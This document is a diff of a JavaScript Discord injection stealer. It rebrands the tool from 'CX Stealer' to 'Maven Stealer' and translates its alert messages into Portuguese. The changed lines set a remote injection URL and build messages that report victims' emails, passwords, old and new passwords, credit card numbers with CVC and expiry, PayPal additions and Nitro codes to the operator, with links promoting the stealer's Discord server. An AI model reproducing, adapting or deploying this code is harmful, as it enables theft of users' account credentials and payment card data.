@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Maven Stealer Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66756278&is=667410f8&hm=f801b938b35a439d5061f609b130616cb0916c4be566a7a5291fe4f222a2fc16&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/gutont/index/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Gutont/index/main/index.js', 
   /**
    
    **/
@@ -306,7 +306,7 @@ class jsSHA {
       var firstHash;
 
       if (false === hmacKeySet) {
-        console.error('Cannot call getHMAC without first setting HMAC key');
+        console.error('Não é possível chamar getHMAC sem primeiro definir a chave HMAC');
       }
 
       const formatFunc = function (binarray) {
@@ -660,12 +660,12 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Information**',
-            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
+            name: '**Informação da conta**',
+            value: `<:mail:1095741024678191114> E-mail: **${email}** - <:blacklock:1095741022065131571> Senha: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Information**',
+            name: '**Informações do Discord**',
             value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: false,
           },
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CX Stealer Injection・https://t.me/CrealStealer',
-            icon_url: "https://i.imgur.com/MS5sOUP.jpeg"
+            text: 'Maven Stealer Injection・https://discord.gg/BjTRs4c7qh',
+            icon_url: "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66756278&is=667410f8&hm=f801b938b35a439d5061f609b130616cb0916c4be566a7a5291fe4f222a2fc16&"
         },
       },
     ],
@@ -703,13 +703,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
+            name: '**Senha alterada**',
+            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Senha Antiga: **${oldpassword}**\n<:blacklock:1095741022065131571> Nova Senha: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041> Tipo De Nitro: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CX Stealer Injection・https://t.me/CrealStealer',
-            icon_url: "https://i.imgur.com/MS5sOUP.jpeg"
+            text: 'Maven Stealer Injection・https://discord.gg/BjTRs4c7qh',
+            icon_url: "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66756278&is=667410f8&hm=f801b938b35a439d5061f609b130616cb0916c4be566a7a5291fe4f222a2fc16&"
         },
       },
     ],
@@ -746,13 +746,13 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
+            name: '**E-mail alterado**',
+            value: `<:mail:1095741024678191114> Novo Email: **${email}**\n<:blacklock:1095741022065131571> Senha: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041> Tipo De Nitro: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CX Stealer Injection・https://t.me/CrealStealer',
-            icon_url: "https://i.imgur.com/MS5sOUP.jpeg"
+            text: 'Maven Stealer Injection・https://discord.gg/BjTRs4c7qh',
+            icon_url: "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66756278&is=667410f8&hm=f801b938b35a439d5061f609b130616cb0916c4be566a7a5291fe4f222a2fc16&"
         },
       },
     ],
@@ -790,12 +790,12 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `É hora de comprar nitro, baby 😩`,
             inline: false,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Informações Do Discord**',
+            value: `<:blackarrow:1095740975197995041> Tipo De Nitro: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CX Stealer Injection・https://t.me/CrealStealer',
-            icon_url: "https://i.imgur.com/MS5sOUP.jpeg"
+            text: 'Maven Stealer Injection・https://discord.gg/BjTRs4c7qh',
+            icon_url: "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66756278&is=667410f8&hm=f801b938b35a439d5061f609b130616cb0916c4be566a7a5291fe4f222a2fc16&"
         },
       },
     ],
@@ -832,13 +832,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: '**Cartão de crédito adicionado**',
+            value: `Número do cartão de crédito: **${number}**\nCVC: **${cvc}**\nExpiração do cartão de crédito: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Informações Do Discord**',
+            value: `<:blackarrow:1095740975197995041> Tipo De Nitro: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CX Stealer Injection・https://t.me/CrealStealer',
-            icon_url: "https://i.imgur.com/MS5sOUP.jpeg"
+            text: 'Maven Stealer Injection・https://discord.gg/BjTRs4c7qh',
+            icon_url: "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66756278&is=667410f8&hm=f801b938b35a439d5061f609b130616cb0916c4be566a7a5291fe4f222a2fc16&"
         },
       },
     ],
@@ -877,13 +877,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            name: '**Comprou Nitro!**',
+            value: `**Código Nitro:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Informação Discord**',
+            value: `<:blackarrow:1095740975197995041> Tipo De Nitro: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CX Stealer Injection・https://t.me/CrealStealer',
-            icon_url: "https://i.imgur.com/MS5sOUP.jpeg"
+            text: 'Maven Stealer Injection・https://discord.gg/BjTRs4c7qh',
+            icon_url: "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66756278&is=667410f8&hm=f801b938b35a439d5061f609b130616cb0916c4be566a7a5291fe4f222a2fc16&"
         },
       },
     ],
